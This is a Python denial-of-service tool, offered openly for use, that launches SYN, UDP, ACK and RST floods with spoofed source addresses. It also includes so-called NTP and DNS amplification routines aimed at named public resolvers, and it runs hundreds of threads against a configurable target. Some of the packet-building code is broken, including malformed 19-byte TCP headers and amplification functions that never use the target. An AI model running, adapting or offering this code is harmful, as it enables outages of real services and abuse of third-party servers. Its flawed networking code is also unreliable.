import socket
import asyncio
import time
import random
import os
import sys
import threading
import ipaddress
from concurrent.futures import ThreadPoolExecutor

# Configuration from environment variables
TARGET = os.getenv("TARGET", "192.168.1.1")  # Target IP
PORT = int(os.getenv("PORT", "80"))          # Target port
DURATION = int(os.getenv("DURATION", "60"))   # Attack duration in seconds
THREADS = int(os.getenv("THREADS", "500"))    # Number of threads
PPS = int(os.getenv("PPS", "1000"))           # Packets per second per thread
METHOD = os.getenv("METHOD", "SYN")           # Attack method: SYN, UDP, ACK, RST, NTP, DNS

# Stats
stats = {
    "start_time": None,
    "packets_sent": 0,
    "bytes_sent": 0
}

# Validate IP address
def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Generate random IP address
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Generate random port
def random_port():
    return random.randint(1, 65535)

# SYN Flood
def syn_flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # IP header
        ip_header = b''
        ip_version = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40  # 20 bytes IP + 20 bytes TCP
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 128
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0  # Kernel will fill this in
        ip_saddr = socket.inet_aton(random_ip())
        ip_daddr = socket.inet_aton(TARGET)
        
        ip_header = bytes([
            (ip_version << 4) + ip_ihl,
            ip_tos,
            (ip_tot_len >> 8) & 0xFF,
            ip_tot_len & 0xFF,
            (ip_id >> 8) & 0xFF,
            ip_id & 0xFF,
            (ip_frag_off >> 8) & 0xFF,
            ip_frag_off & 0xFF,
            ip_ttl,
            ip_proto,
            ip_check,
            (ip_saddr[0]), (ip_saddr[1]), (ip_saddr[2]), (ip_saddr[3]),
            (ip_daddr[0]), (ip_daddr[1]), (ip_daddr[2]), (ip_daddr[3])
        ])
        
        # TCP header
        tcp_source = random_port()
        tcp_dest = PORT
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        tcp_flags = 0x02  # SYN flag
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = bytes([
            (tcp_source >> 8) & 0xFF,
            tcp_source & 0xFF,
            (tcp_dest >> 8) & 0xFF,
            tcp_dest & 0xFF,
            (tcp_seq >> 24) & 0xFF,
            (tcp_seq >> 16) & 0xFF,
            (tcp_seq >> 8) & 0xFF,
            tcp_seq & 0xFF,
            (tcp_ack_seq >> 24) & 0xFF,
            (tcp_ack_seq >> 16) & 0xFF,
            (tcp_ack_seq >> 8) & 0xFF,
            tcp_ack_seq & 0xFF,
            (tcp_doff << 4) + 0,
            tcp_flags,
            (tcp_window >> 8) & 0xFF,
            tcp_window & 0xFF,
            tcp_check,
            (tcp_urg_ptr >> 8) & 0xFF,
            tcp_urg_ptr & 0xFF
        ])
        
        # Packet
        packet = ip_header + tcp_header
        
        # Send packets
        start_time = time.time()
        while time.time() - start_time < DURATION:
            try:
                s.sendto(packet, (TARGET, 0))
                stats["packets_sent"] += 1
                stats["bytes_sent"] += len(packet)
                
                # Control PPS
                time.sleep(1.0 / PPS)
            except:
                pass
        
        s.close()
    except Exception as e:
        print(f"Error in SYN flood: {e}")

# UDP Flood
def udp_flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # IP header
        ip_header = b''
        ip_version = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 28 + random.randint(8, 512)  # 20 bytes IP + 8 bytes UDP + payload
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 128
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0  # Kernel will fill this in
        ip_saddr = socket.inet_aton(random_ip())
        ip_daddr = socket.inet_aton(TARGET)
        
        ip_header = bytes([
            (ip_version << 4) + ip_ihl,
            ip_tos,
            (ip_tot_len >> 8) & 0xFF,
            ip_tot_len & 0xFF,
            (ip_id >> 8) & 0xFF,
            ip_id & 0xFF,
            (ip_frag_off >> 8) & 0xFF,
            ip_frag_off & 0xFF,
            ip_ttl,
            ip_proto,
            ip_check,
            (ip_saddr[0]), (ip_saddr[1]), (ip_saddr[2]), (ip_saddr[3]),
            (ip_daddr[0]), (ip_daddr[1]), (ip_daddr[2]), (ip_daddr[3])
        ])
        
        # UDP header
        udp_source = random_port()
        udp_dest = PORT
        udp_len = random.randint(8, 512)  # 8 bytes header + payload
        udp_check = 0
        
        udp_header = bytes([
            (udp_source >> 8) & 0xFF,
            udp_source & 0xFF,
            (udp_dest >> 8) & 0xFF,
            udp_dest & 0xFF,
            (udp_len >> 8) & 0xFF,
            udp_len & 0xFF,
            udp_check,
            udp_check
        ])
        
        # Random payload
        payload = bytes([random.randint(0, 255) for _ in range(udp_len - 8)])
        
        # Packet
        packet = ip_header + udp_header + payload
        
        # Send packets
        start_time = time.time()
        while time.time() - start_time < DURATION:
            try:
                s.sendto(packet, (TARGET, 0))
                stats["packets_sent"] += 1
                stats["bytes_sent"] += len(packet)
                
                # Control PPS
                time.sleep(1.0 / PPS)
            except:
                pass
        
        s.close()
    except Exception as e:
        print(f"Error in UDP flood: {e}")

# ACK Flood
def ack_flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # IP header
        ip_header = b''
        ip_version = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40  # 20 bytes IP + 20 bytes TCP
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 128
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0  # Kernel will fill this in
        ip_saddr = socket.inet_aton(random_ip())
        ip_daddr = socket.inet_aton(TARGET)
        
        ip_header = bytes([
            (ip_version << 4) + ip_ihl,
            ip_tos,
            (ip_tot_len >> 8) & 0xFF,
            ip_tot_len & 0xFF,
            (ip_id >> 8) & 0xFF,
            ip_id & 0xFF,
            (ip_frag_off >> 8) & 0xFF,
            ip_frag_off & 0xFF,
            ip_ttl,
            ip_proto,
            ip_check,
            (ip_saddr[0]), (ip_saddr[1]), (ip_saddr[2]), (ip_saddr[3]),
            (ip_daddr[0]), (ip_daddr[1]), (ip_daddr[2]), (ip_daddr[3])
        ])
        
        # TCP header
        tcp_source = random_port()
        tcp_dest = PORT
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = random.randint(1, 4294967295)
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        tcp_flags = 0x10  # ACK flag
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = bytes([
            (tcp_source >> 8) & 0xFF,
            tcp_source & 0xFF,
            (tcp_dest >> 8) & 0xFF,
            tcp_dest & 0xFF,
            (tcp_seq >> 24) & 0xFF,
            (tcp_seq >> 16) & 0xFF,
            (tcp_seq >> 8) & 0xFF,
            tcp_seq & 0xFF,
            (tcp_ack_seq >> 24) & 0xFF,
            (tcp_ack_seq >> 16) & 0xFF,
            (tcp_ack_seq >> 8) & 0xFF,
            tcp_ack_seq & 0xFF,
            (tcp_doff << 4) + 0,
            tcp_flags,
            (tcp_window >> 8) & 0xFF,
            tcp_window & 0xFF,
            tcp_check,
            (tcp_urg_ptr >> 8) & 0xFF,
            tcp_urg_ptr & 0xFF
        ])
        
        # Packet
        packet = ip_header + tcp_header
        
        # Send packets
        start_time = time.time()
        while time.time() - start_time < DURATION:
            try:
                s.sendto(packet, (TARGET, 0))
                stats["packets_sent"] += 1
                stats["bytes_sent"] += len(packet)
                
                # Control PPS
                time.sleep(1.0 / PPS)
            except:
                pass
        
        s.close()
    except Exception as e:
        print(f"Error in ACK flood: {e}")

# RST Flood
def rst_flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # IP header
        ip_header = b''
        ip_version = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40  # 20 bytes IP + 20 bytes TCP
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 128
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0  # Kernel will fill this in
        ip_saddr = socket.inet_aton(random_ip())
        ip_daddr = socket.inet_aton(TARGET)
        
        ip_header = bytes([
            (ip_version << 4) + ip_ihl,
            ip_tos,
            (ip_tot_len >> 8) & 0xFF,
            ip_tot_len & 0xFF,
            (ip_id >> 8) & 0xFF,
            ip_id & 0xFF,
            (ip_frag_off >> 8) & 0xFF,
            ip_frag_off & 0xFF,
            ip_ttl,
            ip_proto,
            ip_check,
            (ip_saddr[0]), (ip_saddr[1]), (ip_saddr[2]), (ip_saddr[3]),
            (ip_daddr[0]), (ip_daddr[1]), (ip_daddr[2]), (ip_daddr[3])
        ])
        
        # TCP header
        tcp_source = random_port()
        tcp_dest = PORT
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = random.randint(1, 4294967295)
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        tcp_flags = 0x04  # RST flag
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_header = bytes([
            (tcp_source >> 8) & 0xFF,
            tcp_source & 0xFF,
            (tcp_dest >> 8) & 0xFF,
            tcp_dest & 0xFF,
            (tcp_seq >> 24) & 0xFF,
            (tcp_seq >> 16) & 0xFF,
            (tcp_seq >> 8) & 0xFF,
            tcp_seq & 0xFF,
            (tcp_ack_seq >> 24) & 0xFF,
            (tcp_ack_seq >> 16) & 0xFF,
            (tcp_ack_seq >> 8) & 0xFF,
            tcp_ack_seq & 0xFF,
            (tcp_doff << 4) + 0,
            tcp_flags,
            (tcp_window >> 8) & 0xFF,
            tcp_window & 0xFF,
            tcp_check,
            (tcp_urg_ptr >> 8) & 0xFF,
            tcp_urg_ptr & 0xFF
        ])
        
        # Packet
        packet = ip_header + tcp_header
        
        # Send packets
        start_time = time.time()
        while time.time() - start_time < DURATION:
            try:
                s.sendto(packet, (TARGET, 0))
                stats["packets_sent"] += 1
                stats["bytes_sent"] += len(packet)
                
                # Control PPS
                time.sleep(1.0 / PPS)
            except:
                pass
        
        s.close()
    except Exception as e:
        print(f"Error in RST flood: {e}")

# NTP Amplification
def ntp_amplification():
    try:
        # List of public NTP servers
        ntp_servers = [
            "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org",
            "0.asia.pool.ntp.org", "0.europe.pool.ntp.org", "0.north-america.pool.ntp.org",
            "0.oceania.pool.ntp.org", "0.south-america.pool.ntp.org"
        ]
        
        # NTP request packet (monlist command)
        ntp_request = b'\x17\x00\x03\x2a\x00\x00\x00\x00'
        
        # Create a UDP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Send packets
        start_time = time.time()
        while time.time() - start_time < DURATION:
            try:
                # Choose a random NTP server
                server = random.choice(ntp_servers)
                
                # Spoof source IP
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Send NTP request with spoofed source
                s.sendto(ntp_request, (server, 123))
                stats["packets_sent"] += 1
                stats["bytes_sent"] += len(ntp_request)
                
                # Control PPS
                time.sleep(1.0 / PPS)
            except:
                pass
        
        s.close()
    except Exception as e:
        print(f"Error in NTP amplification: {e}")

# DNS Amplification
def dns_amplification():
    try:
        # List of public DNS servers
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "9.9.9.9", "208.67.222.222", "208.67.220.220"
        ]
        
        # DNS request packet (ANY query for root)
        dns_request = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01'
        
        # Create a UDP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Send packets
        start_time = time.time()
        while time.time() - start_time < DURATION:
            try:
                # Choose a random DNS server
                server = random.choice(dns_servers)
                
                # Spoof source IP
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Send DNS request with spoofed source
                s.sendto(dns_request, (server, 53))
                stats["packets_sent"] += 1
                stats["bytes_sent"] += len(dns_request)
                
                # Control PPS
                time.sleep(1.0 / PPS)
            except:
                pass
        
        s.close()
    except Exception as e:
        print(f"Error in DNS amplification: {e}")

# Main function
def main():
    global stats
    stats["start_time"] = time.time()
    
    # Validate target IP
    if not validate_ip(TARGET):
        print(f"Invalid target IP: {TARGET}")
        return
    
    print(f"Starting {METHOD} flood against {TARGET}:{PORT}")
    print(f"Duration: {DURATION}s | Threads: {THREADS} | PPS per thread: {PPS}")
    
    # Create thread pool
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        if METHOD == "SYN":
            for _ in range(THREADS):
                executor.submit(syn_flood)
        elif METHOD == "UDP":
            for _ in range(THREADS):
                executor.submit(udp_flood)
        elif METHOD == "ACK":
            for _ in range(THREADS):
                executor.submit(ack_flood)
        elif METHOD == "RST":
            for _ in range(THREADS):
                executor.submit(rst_flood)
        elif METHOD == "NTP":
            for _ in range(THREADS):
                executor.submit(ntp_amplification)
        elif METHOD == "DNS":
            for _ in range(THREADS):
                executor.submit(dns_amplification)
        else:
            print(f"Unknown method: {METHOD}")
            return
    
    # Wait for attack to complete
    time.sleep(DURATION)
    
    # Print stats
    elapsed = time.time() - stats["start_time"]
    pps = stats["packets_sent"] / max(elapsed, 1)
    mb_sent = stats["bytes_sent"] / (1024 * 1024)
    
    print("\n=== Attack Complete ===")
    print(f"Target: {TARGET}:{PORT}")
    print(f"Method: {METHOD}")
    print(f"Duration: {elapsed:.1f}s")
    print(f"Packets sent: {stats['packets_sent']}")
    print(f"PPS: {pps:.1f}")
    print(f"Data sent: {mb_sent:.2f} MB")

if __name__ == "__main__":
    main()
